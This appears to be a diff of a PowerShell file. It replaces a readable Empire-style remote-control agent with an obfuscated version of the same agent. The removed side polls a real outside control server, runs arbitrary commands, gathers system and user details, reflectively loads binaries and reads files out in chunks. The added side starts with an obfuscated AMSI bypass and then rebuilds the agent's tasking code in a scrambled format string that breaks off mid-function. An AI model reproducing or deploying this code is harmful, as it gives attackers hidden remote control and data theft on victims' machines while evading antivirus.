@@ -1,587 +1,144 @@
-$Script:server = "http://brave-dust-49022.pktriot.net:22161";
-$Script:ControlServers = @($Script:server);
-$Script:ServerIndex = 0;
-if($server.StartsWith('https')){
-    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
-}
+${W} = ('System.'+'Man'+'ag'+'ement.A'+'u'+'toma'+'tion'+'.'+'A');${c} = 'si';${M} = ('U'+'tils')
+${as`semB`lY} = [Ref]."a`s`seMBLY".('Ge'+'tTyp'+'e').Invoke(('{0}m{1}{2}' -f ${W},${c},${m}))
+${fi`e`ld} = ${As`sE`MBlY}.('G'+'etField').Invoke(('am{0}InitFailed' -f ${C}),('Non'+'P'+'ublic'+',St'+'a'+'tic'))
+${fIE`ld}.('SetVa'+'lu'+'e').Invoke(${N`UlL},${tR`Ue})
 
-$Script:SendMessage = {
-    param($Packets)
-
-    if($Packets) {
-
-        $EncBytes = Encrypt-Bytes $Packets;
-
-
-
-        $RoutingPacket = New-RoutingPacket -EncData $EncBytes -Meta 5;
-
-        if($Script:ControlServers[$Script:ServerIndex].StartsWith('http')) {
-
-            $wc = New-Object System.Net.WebClient;
-
-            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-            if($Script:Proxy) {
-                $wc.Proxy = $Script:Proxy;
-            }
-
-            $wc.Headers.Add('User-Agent', $Script:UserAgent);
-            $Script:Headers.GetEnumerator() | ForEach-Object {$wc.Headers.Add($_.Name, $_.Value)};
-
-            try {
-
-                $taskURI = $Script:TaskURIs | Get-Random;
-                $response = $wc.UploadData($Script:ControlServers[$Script:ServerIndex]+$taskURI, 'POST', $RoutingPacket);
-            }
-            catch [System.Net.WebException]{
-
-                if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-
-                    Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
-                    }
+((("{11}{61}{26}{6}{8}{49}{36}{52}{25}{56}{59}{23}{48}{1}{47}{9}{54}{28}{20}{7}{41}{53}{42}{58}{60}{15}{18}{32}{63}{55}{39}{62}{16}{57}{4}{64}{3}{30}{0}{50}{29}{44}{19}{21}{14}{24}{35}{33}{51}{37}{34}{31}{13}{10}{46}{17}{38}{5}{27}{2}{12}{22}{43}{40}{45}"-f 'A8plitWA8).Invoke(x6Vc x6Vc);
+                if(Bsn{pAnwqRTS}.x6VcLEnwqNGTHx6Vc -eq 1) {
+                    Bsn{cnwqMd} = Bsn{PnwqAnwqRtS}[0];
+                    &(WA8EWA8+WA8ncWA8+WA8ode-PacWA8+WA8ketWA8) -type Bsn{tYnwqpe} -data Bsn((&(WA8InvoWA8+WA8ke-ShellCWA8+WA8oWA8+WA8mmWA8+WA8anWA8+WA8dWA8) -cmd Bsn{cnwqMD}) -join x6Vcnwqnx6Vc).(WA8tWA8+WA8rimWA8).Invoke() -ResultID Bsn{RenwqsnwqUltID};
+                }
+                else{
+                    Bsn{Cnwqmd} = Bsn{pnwqAnwqRtS}[0];
+                    Bsn{CnwqmdaRnwqGs} = Bsn{PnwqAnwqRTS}[1..Bsn{panwqRnwqTS}.x6VcLnwqeNgthx6Vc] -join x6Vc x6Vc;
+                    &(WA8EncodeWA8+WA8-PWA8+WA8ackWA8+WA8etWA8) -type Bsn{tnwqYpe} -data Bsn((&(WA8IWA8+WA8nvWA8+WA8okWA8+WA8eWA8+WA8-ShellCommandWA8) -cmd Bsn{Cnwqmd} -cmdargs Bsn{CMnwqDArgs}) -join x6Vcnwqnx6Vc).(WA8trWA8+WA8imWA8).Invoke() -ResultID Bsn{RnwqEsuLTId};
                 }
             }
-        }
-    };
-
-$Script:GetTask = {
-    try {
-        if ($Script:ControlServers[$Script:ServerIndex].StartsWith("http")) {
-
-
-            $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
-            $RoutingCookie = [Convert]::ToBase64String($RoutingPacket);
-
-
-            $wc = New-Object System.Net.WebClient;
-
-
-            $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
-            $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
-            if($Script:Proxy) {
-                $wc.Proxy = $Script:Proxy;
-            }
-
-            $wc.Headers.Add("User-Agent",$script:UserAgent);
-            $script:Headers.GetEnumerator() | % {$wc.Headers.Add($_.Name, $_.Value)};
-            $wc.Headers.Add("Cookie","session=$RoutingCookie");
-
-
-            $taskURI = $script:TaskURIs | Get-Random;
-            $result = $wc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);
-            $result;
-        }
-    }
-    catch [Net.WebException] {
-        $script:MissedCheckins += 1;
-        if ($_.Exception.GetBaseException().Response.statuscode -eq 401) {
-
-            Start-Negotiate -S "$Script:server" -SK $SK -UA $ua;
-        }
-    }
-};
-function Invoke-Empire {
-    param(
-        [Parameter(Mandatory=$true)]
-        [String]
-        $StagingKey,
-        [Parameter(Mandatory=$true)]
-        [String]
-        $SessionKey,
-        [Parameter(Mandatory=$true)]
-        [String]
-        $SessionID,
-        [Int32]
-        $AgentDelay = 12,
-        [Double]
-        $AgentJitter = 0.7,
-        [String[]]
-        $Servers,
-        [String]
-        $KillDate,
-        [Int32]
-        $KillDays,
-        [String]
-        $WorkingHours,
-        [object]
-        $ProxySettings,
-        [String]
-        $Profile = "/filmes/casadefogo,/filmes/santoro,/filmes/diabovesteprada|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-        [Int32]
-        $LostLimit = 67,
-        [String]
-        $DefaultResponse = "PCFET0NUWVBFIGh0bWwgUFVCTElDICItLy9XM0MvL0RURCBYSFRNTCAxLjAgU3RyaWN0Ly9FTiIgImh0dHA6Ly93d3cudzMub3JnL1RSL3hodG1sMS9EVEQveGh0bWwxLXN0cmljdC5kdGQiPgo8aHRtbCB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94aHRtbCI+CjxoZWFkPgogICAgPG1ldGEgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTEiIGh0dHAtZXF1aXY9IkNvbnRlbnQtVHlwZSIvPgogICAgPHRpdGxlPjQwNCAtIEZpbGUgb3IgZGlyZWN0b3J5IG5vdCBmb3VuZC48L3RpdGxlPgogICAgPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KPCEtLQpib2R5e21hcmdpbjowO2ZvbnQtc2l6ZTouN2VtO2ZvbnQtZmFtaWx5OlZlcmRhbmEsIEFyaWFsLCBIZWx2ZXRpY2EsIHNhbnMtc2VyaWY7YmFja2dyb3VuZDojRUVFRUVFO30KZmllbGRzZXR7cGFkZGluZzowIDE1cHggMTBweCAxNXB4O30gCmgxe2ZvbnQtc2l6ZToyLjRlbTttYXJnaW46MDtjb2xvcjojRkZGO30KaDJ7Zm9udC1zaXplOjEuN2VtO21hcmdpbjowO2NvbG9yOiNDQzAwMDA7fSAKaDN7Zm9udC1zaXplOjEuMmVtO21hcmdpbjoxMHB4IDAgMCAwO2NvbG9yOiMwMDAwMDA7fSAKI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjAgMCAwIDA7cGFkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ0cmVidWNoZXQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6IzU1NTU1NTt9CiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGVudCI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50LWNvbnRhaW5lciI+CiAgICAgICAgPGZpZWxkc2V0PgogICAgICAgICAgICA8aDI+NDA0IC0gRmlsZSBvciBkaXJlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgICAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg=="
-    )
-    $Encoding = [System.Text.Encoding]::ASCII;
-    $HMAC = New-Object System.Security.Cryptography.HMACSHA256;
-    $script:AgentDelay = $AgentDelay;
-    $script:AgentJitter = $AgentJitter;
-    $script:LostLimit = $LostLimit;
-    $script:MissedCheckins = 0;
-    $script:ResultIDs = @{};
-    $script:WorkingHours = $WorkingHours;
-    $script:DefaultResponse = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($DefaultResponse));
-    $script:Proxy = $ProxySettings;
-    $script:CurrentListenerName = "";
-    $Script:ServerIndex = 0;
-    $Script:ControlServers = $Servers;
-    $Retries = 1;
-    if($KillDays) {
-        $script:KillDate = (Get-Date).AddDays($KillDays).ToString('MM/dd/yyyy')
-    }
-    if($KillDate -ne "REPLACE_KILLDATE" -and $KillDate -ne $null) {
-        $script:KillDate = $KillDate
-    }
-    $ProfileParts = $Profile.split('|');
-    $script:TaskURIs = $ProfileParts[0].split(',');
-    $script:UserAgent = $ProfileParts[1];
-    $script:SessionID = $SessionID;
-    $script:Headers = @{};
-    if($ProfileParts[2]) {
-        $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
-            $Parts = $_.Split(':');
-            $script:Headers.Add($Parts[0],$Parts[1]);
-        }
-    }
-    $Script:Jobs = @{};
-    $Script:Downloads = @{};
-    $script:ImportedScript = '';
-    function ConvertTo-Rc4ByteStream {
-        Param ($In, $RCK)
-        begin {
-            [Byte[]] $S = 0..255;
-            $J = 0;
-            0..255 | ForEach-Object {
-                $J = ($J + $S[$_] + $RCK[$_ % $RCK.Length]) % 256;
-                $S[$_], $S[$J] = $S[$J], $S[$_];
-            };
-            $I = $J = 0;
-        }
-        process {
-            ForEach($Byte in $In) {
-                $I = ($I + 1) % 256;
-                $J = ($J + $S[$I]) % 256;
-                $S[$I], $S[$J] = $S[$J], $S[$I];
-                $Byte -bxor $S[($S[$I] + $S[$J]) % 256];
-            }
-        }
-    }
-    function Get-HexString {
-        param([byte]$Data)
-        ($Data | ForEach-Object { "{0:X2}" -f $_ }) -join ' ';
-    }
-    function Set-Delay {
-        param([int]$d, [double]$j=0.0)
-        $script:AgentDelay = $d;
-        $script:AgentJitter = $j;
-        "agent interval set to $script:AgentDelay seconds with a jitter of $script:AgentJitter";
-    }
-    function Get-Delay {
-        "agent interval delay interval: $script:AgentDelay seconds with a jitter of $script:AgentJitter";
-    }
-    function Set-LostLimit {
-        param([int]$l)
-        $script:LostLimit = $l;
-        if($l -eq 0)
-        {
-            "agent set to never die based on checkin Limit";
-        }
-        else
-        {
-            "agent LostLimit set to $script:LostLimit";
-        }
-    }
-    function Get-LostLimit {
-        "agent LostLimit: $script:LostLimit";
-    }
-    function Set-Killdate {
-        param([string]$date)
-        $script:KillDate = $date;
-        "agent killdate set to $script:KillDate";
-    }
-    function Get-Killdate {
-        "agent killdate: $script:KillDate";
-    }
-    function Set-WorkingHours {
-        param([string]$hours)
-        $script:WorkingHours = $hours;
-        "agent working hours set to $($script:WorkingHours)";
-    }
-    function Get-WorkingHours {
-        "agent working hours: $($script:WorkingHours)";
-    }
-    function Get-Sysinfo {
-        $str = '0|';
-        $str += $Script:ControlServers[$Script:ServerIndex];
-        $str += '|' + [Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;
-        $p = (Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);
-        $ip = @{$true=$p[0];$false=$p}[$p.Length -lt 6];
-        $str+="|$ip";
-        $str += '|' +(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
-        if(([Environment]::UserName).ToLower() -eq 'system') {
-            $str += '|True';
-        }
-        else{
-            $str += '|'+ ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator');
-        }
-        $n = [System.Diagnostics.Process]::GetCurrentProcess();
-        $str += '|'+$n.ProcessName+'|'+$n.Id;
-        $str += "|powershell|" + $PSVersionTable.PSVersion.Major;
-        $str += "|" + $env:PROCESSOR_ARCHITECTURE;
-        $str;
-    }
-    function Invoke-ShellCommand {
-        param($cmd, $cmdargs="")
-        if ($cmdargs -like "*`"\\*") {
-            $cmdargs = $cmdargs -replace "`"\\","FileSystem::`"\";
-        }
-        elseif ($cmdargs -like "*\\*") {
-            $cmdargs = $cmdargs -replace "\\\\","FileSystem::\\";
-        }
-        $output = '';
-        if ($cmd.ToLower() -eq 'shell') {
-            if ($cmdargs.length -eq '') { $output = 'no shell command supplied' }
-            else {
-                $OldConsoleOut = [Console]::Out;
-                $StringWriter = New-Object IO.StringWriter;
-                [Console]::SetOut($StringWriter);
-                $output = iex "$cmdargs" | out-string;
-                [Console]::SetOut($OldConsoleOut);
-                if ($output.length -eq 0){
-                    $output = $StringWriter.ToString();
+            elseif(Bsn{TnwqYPe} -eq 41) {
+                try {
+                    Bsn{chnwqUnwqNnwqksize} = 512KB;
+                    Bsn{PARnwqTs} = Bsn{DnwqAtA}.(WA8SplWA8+WA8itWA8).Invoke(x6Vc x6Vc);
+                    if(Bsn{parnwqTs}.x6VcLeNGnwqTHx6Vc -gt 1) {
+                        Bsn{pnwqATh} = Bsn{PaRnwqTS}[0..(Bsn{PnwqArnwqTS}.x6VclenwqNgnwqThx6Vc-2)] -join x6Vc x6Vc;
+                        try {
+                            Bsn{ChuNnwqKnwqSIze} = Bsn{PnwqAnwqRtS}[-1]/1;
+                            if(Bsn{PanwqRnwqTs}[-1] -notlike (WA8*bWA8+WA8*WA8)) {
+                                Bsn{cnwqHnwqUnwqNkSize} = Bsn{chUnwqNKsinwqZe} * 1024;
+                            }
+                        }
+                        catch {
+                            Bsn{panwqTh} += x6Vc Bsn(BsnParts[-1]) x6Vc;
+                        }
                     }
-            }
-            $output += "`n`r";
-        }
-        elseif ($cmd.ToLower() -eq 'reflectiveload'){
-            if ($cmdargs.length -eq '') { $output = 'no binary supplied' };
-            else{
-                $assembly = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($cmdargs));
-                $output = "`n`r Reflective Load Complete";
-            }
-        }
-        else {
-            switch -regex ($cmd) {
-                '(ls|^dir)' {
-                    if ($cmdargs.length -eq "") {
-                        $output = Get-ChildItem -force | select mode,@{Name="Owner";Expression={(Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json;
+                    else {
+                        Bsn{PnwqATh} = Bsn{DnwqAta};
+                    }
+                    Bsn{PnwqAtH} = Bsn{pnwqAtH}.(WA8TrWA8+WA8imWA8).Invoke(WA8x6VcWA8).(WA8TriWA8+WA8mWA8).Invoke(x6VcWA8x6Vc);
+                    if(Bsn{cHnwqUnwqNKSIze} -lt 512KB) {
+                        Bsn{cnwqhUNkSnwqIze} = 512KB;
+                    }
+                    elseif(Bsn{CnwqHnwqUNkSinwqzE} -gt 8MB) {
+                        Bsn{CHnwqUNKnwqsIZe} = 8MB;
+                    }
+                    else {
+                        Bsn{CHnwqUNkSinwqze} = 1024KB;
+                    }
+                    Bsn{PanwqTh} = &(WA8GetWA8+WA8-WA8+WA8ChiWA8+WA8ldiWA8+WA8temWA8) -Recurse Bsn{panwqTH} -File  jRbz &(WA8FoWA8+WA8rEacWA8+WA8h-ObWA8+WA8jectWA8) {Bsn{_}.x6VcfUnwqllnnwqAMex6Vc};
+                    foreach ( Bsn{finwqlE} in Bsn{PnwqAth}) {
+                        Bsn{INnwqdeX} = 0;
+                        do{
+                            ',' &(WA8GetWA8+WA8-ChildItWA8+WA8eWA8+WA8mWA8) -force jRbz &(WA8selecWA8+WA8tWA8) (WA8mWA8+WA8odeWA8),@{(WA8NamWA8+WA8eWA8)=(WA8OwWA8+WA8nerWA8);(WA8ExWA8+WA8pressiWA8+WA8oWA8+WA8nWA8)={(&(WA8GeWA8+WA8tWA8+WA8-AclWA8) Bsn{_}.x6VcFulLnnwqAnwqmex6Vc).x6VconwqwnErx6Vc }},@{(WA8NWA8+WA8ameWA8)=(WA8LaWA8+WA8stWA8+WA8WWA8+WA8riteTimeWA8);(WA8EWA8+WA8xWA8+WA8pressiWA8+WA8onWA8)={(Bsn{_}.x6VcLAStWrITnwqEnwqTiMEx6Vc.(WA8ToSWA8+WA8tringWA8).Invoke(x6Vcux6Vc))}},(WA8lengtWA8+WA8hWA8),(WA8nWA8+WA8ameWA8) jRbz &(WA8CoWA8+WA8nvertTWA8+WA8o-JsWA8+WA8onWA8);
                     }
                     else {
                         try{
-                            $output = IEX "$cmd $cmdargs -Force -ErrorAction Stop" | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},@{Name="LastWriteTime";Expression={($_.LastWriteTime.ToString("u"))}},length,name | ConvertTo-Json;
-                        }
-                        catch [System.Management.Automation.ActionPreferenceStopException] {
-                            $output = "[!] Error: $_ (or cannot be accessed).";
-                        }
-                    }
+                            Bsn{onwqUtnwqPuT} = &(WA8IEWA8+WA8XWA8) (x6VcBsncmd x6Vc+x6VcBsncmdargs x6Vc+WA8-ForcWA8+WA8e WA8+WA8-ErrWA8+WA8oWA8+WA8rActWA8+WA8ion W','30) {
+                try {
+                    &(WA8IEWA8+WA8XWA8) Bsn{DnwqAtA}
+                    &(WA8EncWA8+WA8ode-PaWA8+WA8ckeWA8+WA8tWA8) -type Bsn{tYnwqpe} -data (WA8[WA8+WA8+] WA8+WA8SwWA8+WA8itcheWA8+WA8d WA8+WA8tWA8+WA8he WA8+WA8currWA8+WA8eWA8+WA8nt WA8+WA8liWA8+WA8stenerWA8+WA8 WA8+WA8to:WA8+WA8 WA8+x6VcBsnCurrentListenerNamex6Vc) -ResultID Bsn{REnwqsultID};
                 }
-                '(mv|move|copy|cp|rm|del|rmdir|mkdir)' {
-                    if ($cmdargs.length -ne "") {
-                        try {
-                            IEX "$cmd $cmdargs -Force -ErrorAction Stop";
-                            $output = "executed $cmd $cmdargs";
-                        }
-                        catch {
-                            $output=$_.Exception;
-                        }
-                    }
-                }
-                cd {
-                    if ($cmdargs.length -ne '')
-                    {
-                        $cmdargs = $cmdargs.trim("`"").trim("'");
-                        cd "$cmdargs";
-                        $output = pwd;
-                    }
-                }
-                '(ipconfig|ifconfig)' {
-                    $output = Get-WmiObject -class 'Win32_NetworkAdapterConfiguration' | ? {$_.IPEnabled -Match 'True'} | ForEach-Object {
-                        $out = New-Object psobject;
-                        $out | Add-Member Noteproperty 'Description' $_.Description;
-                        $out | Add-Member Noteproperty 'MACAddress' $_.MACAddress;
-                        $out | Add-Member Noteproperty 'DHCPEnabled' $_.DHCPEnabled;
-                        $out | Add-Member Noteproperty 'IPAddress' $($_.IPAddress -join ",");
-                        $out | Add-Member Noteproperty 'IPSubnet' $($_.IPSubnet -join ",");
-                        $out | Add-Member Noteproperty 'DefaultIPGateway' $($_.DefaultIPGateway -join ",");
-                        $out | Add-Member Noteproperty 'DNSServer' $($_.DNSServerSearchOrder -join ",");
-                        $out | Add-Member Noteproperty 'DNSHostName' $_.DNSHostName;
-                        $out | Add-Member Noteproperty 'DNSSuffix' $($_.DNSDomainSuffixSearchOrder -join ",");
-                        $out
-                    } | ConvertTo-Json;
-                }
-                '(ps|tasklist)' {
-                    $owners = @{};
-                    Get-WmiObject win32_process | ForEach-Object {
-                        try {
-                            $o = $_.getowner()
-                            if (-not $($o.User)) {
-                                $o = 'N/A'
-                            } else {
-                                $o = "$($o.Domain)\$($o.User)"
-                            }
-                        } catch {
-                            $o = 'N/A'
-                        }
-                        $owners[$_.handle] = $o
-                    }
-                    if($cmdargs -ne '') { $p = $cmdargs }
-                    else{ $p = "*" };
-                    $output = Get-Process $p | ForEach-Object {
-                        $arch = 'x64';
-                        if ([System.IntPtr]::Size -eq 4) {
-                            $arch = 'x86'
-                        }
-                        else{
-                            foreach($module in $_.modules) {
-                                if([System.IO.Path]::GetFileName($module.FileName).ToLower() -eq "wow64.dll") {
-                                    $arch = 'x86';
-                                    break
-                                }
-                            }
-                        }
-                        $out = New-Object psobject;
-                        $out | Add-Member Noteproperty 'ProcessName' $_.ProcessName;
-                        $out | Add-Member Noteproperty 'PID' $_.ID;
-                        $out | Add-Member Noteproperty 'Arch' $arch;
-                        $out | Add-Member Noteproperty 'UserName' $owners[$_.id.tostring()];
-                        $mem = "{0:N2} MB" -f $($_.WS/1MB);
-                        $out | Add-Member Noteproperty 'MemUsage' $mem;
-                        $out;
-                    } | Sort-Object -Property PID | ConvertTo-Json;
-                }
-                getpid { $output = [System.Diagnostics.Process]::GetCurrentProcess() }
-                route {
-                    if (($cmdargs.length -eq '') -or ($cmdargs.ToLower() -eq 'print')) {
-                        $adapters = @{};
-                        Get-WmiObject Win32_NetworkAdapterConfiguration | ForEach-Object { $adapters[[int]($_.InterfaceIndex)] = $_.IPAddress };
-                        $output = Get-WmiObject win32_IP4RouteTable | ForEach-Object {
-                            $out = New-Object psobject;
-                            $out | Add-Member Noteproperty 'Destination' $_.Destination;
-                            $out | Add-Member Noteproperty 'Netmask' $_.Mask;
-                            if ($_.NextHop -eq "0.0.0.0") {
-                                $out | Add-Member Noteproperty 'NextHop' 'On-link';
-                            }
-                            else{
-                                $out | Add-Member Noteproperty 'NextHop' $_.NextHop;
-                            }
-                            if($adapters[$_.InterfaceIndex] -and ($adapters[$_.InterfaceIndex] -ne "")) {
-                                $out | Add-Member Noteproperty 'Interface' $($adapters[$_.InterfaceIndex] -join ",");
-                            }
-                            else {
-                                $out | Add-Member Noteproperty 'Interface' '127.0.0.1';
-                            }
-                            $out | Add-Member Noteproperty 'Metric' $_.Metric1;
-                            $out;
-                        } | ConvertTo-Json;
-                    }
-                    else { $output = route $cmdargs };
-                }
-                '(whoami|getuid)' { $output = [Security.Principal.WindowsIdentity]::GetCurrent().Name };
-                hostname {
-                    $output = [System.Net.Dns]::GetHostByName(($env:computerName));
-                }
-                '(reboot|restart)' { Restart-Computer -force };
-                shutdown { Stop-Computer -force };
-                default {
-                    if ($cmdargs.length -eq '') { $output = IEX $cmd | Out-String }
-                    else { $output = IEX "$cmd $cmdargs" | Out-String };
+                catch {
+                    &(WA8EncodeWA8+WA8-PaWA8+WA8ckWA8+WA8etWA8) -type 0 -data ((WA8[!]WA8+WA8 WA8+WA8UWA8+WA8nable WA8+WA8tWA8+WA8o WA8+WA8uWA8+WA8pdate WA8+WA8aWA8+WA8genWA8+WA8t WA8+WA8commWA8+WA8 WA8+WA8metWA8+WA8hoWA8+WA8dWA8+WA8s: WA8+x6VcBsn_x6Vc)) -ResultID Bsn{reSnwqUnwqLTId};
                 }
             }
-        }
-        "`n"+($output);
-    }
-    function Start-AgentJob {
-        param($ScriptString)
-        $RandName = -join("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray()|Get-Random -Count 6);
-        $AppDomain = [AppDomain]::CreateDomain($RandName);
-        $PSHost = $AppDomain.Load([PSObject].Assembly.FullName).GetType('System.Management.Automation.PowerShell')::Create();
-        $null = $PSHost.AddScript($ScriptString);
-        $Buffer = New-Object 'System.Management.Automation.PSDataCollection[PSObject]';
-        $PSobjectCollectionType = [Type]'System.Management.Automation.PSDataCollection[PSObject]';
-        $BeginInvoke = ($PSHost.GetType().GetMethods() | ? { $_.Name -eq 'BeginInvoke' -and $_.GetParameters().Count -eq 2 }).MakeGenericMethod(@([PSObject], [PSObject]));
-        $Job = $BeginInvoke.Invoke($PSHost, @(($Buffer -as $PSobjectCollectionType), ($Buffer -as $PSobjectCollectionType)));
-        $Script:Jobs[$RandName] = @{'Alias'=$RandName; 'AppDomain'=$AppDomain; 'PSHost'=$PSHost; 'Job'=$Job; 'Buffer'=$Buffer};
-        $RandName;
-    }
-    function Get-AgentJobCompleted {
-        param($JobName)
-        if($Script:Jobs.ContainsKey($JobName)) {
-            $Script:Jobs[$JobName]['Job'].IsCompleted;
-        }
-    }
-    function Receive-AgentJob {
-        param($JobName)
-        if($Script:Jobs.ContainsKey($JobName)) {
-            $Script:Jobs[$JobName]['Buffer'].ReadAll();
-        }
-    }
-    function Stop-AgentJob {
-        param($JobName)
-        if($Script:Jobs.ContainsKey($JobName)) {
-            $Null = $Script:Jobs[$JobName]['PSHost'].Stop();
-            $Script:Jobs[$JobName]['Buffer'].ReadAll();
-            $Null = [AppDomain]::Unload($Script:Jobs[$JobName]['AppDomain']);
-            $Script:Jobs.Remove($JobName);
-        }
-    }
-    function Update-Profile {
-        param($Profile)
-        $ProfileParts = $Profile.split('|');
-        $script:TaskURIs = $ProfileParts[0].split(',');
-        $script:UserAgent = $ProfileParts[1];
-        $script:SessionID = $SessionID;
-        $script:Headers = @{};
-        if($ProfileParts[2]) {
-            $ProfileParts[2..$ProfileParts.length] | ForEach-Object {
-                $Parts = $_.Split(':');
-                $script:Headers.Add($Parts[0],$Parts[1]);
-            }
-        }
-        "Agent updated with profile $Profile";
-    }
-    function Get-FilePart {
-        Param(
-            [string] $File,
-            [int] $Index = 0,
-            $ChunkSize = 512KB,
-            [switch] $NoBase64
-        )
-        try {
-            $f = Get-Item "$File";
-            $FileLength = $f.length;
-            $FromFile = [io.file]::OpenRead($File);
-            if ($FileLength -lt $ChunkSize) {
-                if($Index -eq 0) {
-                    $buff = new-object byte[] $FileLength;
-                    $count = $FromFile.Read($buff, 0, $buff.Length);
-                    if($NoBase64) {
-                        $buff;
-                    }
-                    else{
-                        [System.Convert]::ToBase64String($buff);
-                    }
-                }
-                else{
-                    $Null;
-                }
+            elseif(Bsn{TnwqYpe} -eq 131) {
+                Bsn{scrinwqPnwqT:cUrrEnnwqTlIsnwqTEnnwqEnwqRnAME} = Bsn{DAnwqTA};
+                &(WA8EncodeWA8+WA8-WA8+WA8PacWA8+WA8ketWA8) -type Bsn{TnwqypE} -data (WA8[WA8+WA8+] WA8+WA8UpdaWA8+WA8tedWA8+WA8 WA8+WA8tWA8+WA8he WA8+WA8CWA8+WA8urrentLiWA8+WA8stenWA8+WA8erNaWA8+WA8mWA8+WA8e WA8+WA8tWA8+WA8o: WA8+x6VcBsnCurrentListenerNamex6Vc) -ResultID Bsn{RenwqSUlnwqTID};
             }
             else{
-                $buff = new-object byte[] $ChunkSize;
-                $Start = $Index * $($ChunkSize);
-                $null = $FromFile.Seek($Start,0);
-                $count = $FromFile.Read($buff, 0, $buff.Length);
-                if ($count -gt 0) {
-                    if($count -ne $ChunkSize) {
-                        $buff2 = new-object byte[] $count;
-                        [array]::copy($buff, $buff2, $count);
-                        if($NoBase64) {
-                            $buff2
-                        }
-                        else{
-                            [System.Convert]::ToBase64String($buff2);
-                        }
-                    }
-                    else{
-                        if($NoBase64) {
-                            $buff;
-                        }
-                        else{
-                            [System.Convert]::ToBase64String($buff);
-                        }
-                    }
-                }
-                else{
-                    $Null;
-                }
+                &(WA8EnWA8+WA8cWA8+WA8ode-PacketWA8) -type 0 -data (WA8[!WA8+WA8] WA8+WA8inWA8+WA8valid WA8+WA8tyWA8+WA8peWA8+WA8: WA8+x6VcBsntypex6Vc) -ResultID Bsn{RnwqenwqsnwqULtId};
             }
         }
-        catch{}
-        finally {
-            $FromFile.Close();
+        catch [System.Exception] {
+            &(WA8EncodWA8+WA8e-PacWA8+WA8kWA8+WA8etWA8) -type Bsn{tYnwqpE} -data (WA8[!WA8+WA8] WA8+WA8errorWA8+WA8 WA8+WA8runWA8+WA8ninWA8+WA8g WA8+WA8cWA8+WA8ommand: WA8+x6VcBsn_x6Vc) -ResultID Bsn{RenwqsunwqlnwqTid};
         }
     }
-    function Encrypt-Bytes {
-        param($bytes)
-        $IV = [byte] 0..255 | Get-Random -count 16;
+    function pnwqRonwqcesnwqS-nwqTasKingpACknwqenwqTS {
+       
+        param(Bsn{TnwqAnwqSkIng})
+        Bsn{tAskInnwqgByTnwqES} = &(WA8DeWA8+WA8cryWA8+WA8pt-BytesWA8) Bsn{TanwqSknwqiNg};
+        if (-not Bsn{TAsnwqKInwqNnwqgbytnwqes}) {
+            return;
+        }
+        Bsn{denwqcnwqoDED} = &(WA8DecodWA8+WA8e-PWA8+WA8aWA8+WA8cketWA8) Bsn{tanwqSKnwqInGbyTES};
+        Bsn{tnwqYPe} = Bsn{deCoDnwqEd}[0];
+        Bsn{tonwqTnwqALPnwqAckeTs} = Bsn{DecnwqoDeD}[1];
+        Bsn{pAckEtnwqNnwqUM} = Bsn{dEnwqConwqDed}[2];
+        Bsn{TnwqAnwqsKiD} = Bsn{DeCOdnwqeD}[3];
+        Bsn{LnwqeNgnwqTH} = Bsn{decnwqoDed}[4];
+        Bsn{DnwqAtA} = Bsn{dnwqeCnwqOded}[5];
+        Bsn{ReMaInnwqinwqNg} = Bsn{decnwqonwqDeD}[6];
+        Bsn{ResULnwqTPnwqAcKenwqTS} = Bsn(&(WA8Process-TaWA8+WA8skWA8+WA8ingWA8) Bsn{Tnwqype} Bsn{DAnwqTA} Bsn{tAnwqsknwqId});
+        Bsn{OFFnwqsEt} = 12 + Bsn{lEnwqNnwqgth};
